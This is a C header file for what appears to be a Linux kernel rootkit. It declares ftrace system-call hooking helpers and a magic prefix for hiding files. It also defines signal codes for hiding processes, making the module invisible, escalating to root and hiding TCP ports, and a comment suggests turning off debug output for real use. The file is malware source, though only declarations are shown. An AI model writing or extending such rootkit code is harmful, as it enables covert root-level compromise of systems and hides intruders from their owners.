#ifndef HOOKS_H
#define HOOKS_H

#include <linux/init.h>
#include <linux/ftrace.h>
#include <linux/dirent.h>
#include <linux/kallsyms.h>
#include <linux/kernel.h>
#include <linux/linkage.h>
#include <linux/module.h>
#include <linux/slab.h>
#include <linux/syscalls.h>
#include <linux/tcp.h>
#include <linux/uaccess.h>
#include <linux/version.h>

// magic prefix
#define PREFIX "br0k3_n0w_h1dd3n"

// comment this macro in real senary
#define DEBUG

#define MAX_TCP_PORTS 65535

#define HOOK(_name, _hook, _orig) \
  { .name = (_name), .function = (_hook), .original = (_orig), }

#define USE_FENTRY_OFFSET 0
#if !USE_FENTRY_OFFSET
#pragma GCC optimize("-fno-optimize-sibling-calls")
#endif

struct ftrace_hook {
  const char *name;
  void *function;
  void *original;

  unsigned long address;
  struct ftrace_ops ops;
};

int fh_resolve_hook_address(struct ftrace_hook *hook);

void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip,
                             struct ftrace_ops *ops, struct pt_regs *regs);

int fh_install_hook(struct ftrace_hook *hook);

void fh_remove_hook(struct ftrace_hook *hook);

int fh_install_hooks(struct ftrace_hook *hooks, size_t count);

void fh_remove_hooks(struct ftrace_hook *hooks, size_t count);

enum { SIGHIDE = 31, SIGMODINVIS = 63, SIGROOT = 64, SIGPORT = 62 };

#ifndef IS_ENABLED
#define IS_ENABLED(option) \
  (defined(__enabled_##option) || defined(__enabled_##option##_MODULE))
#endif

#endif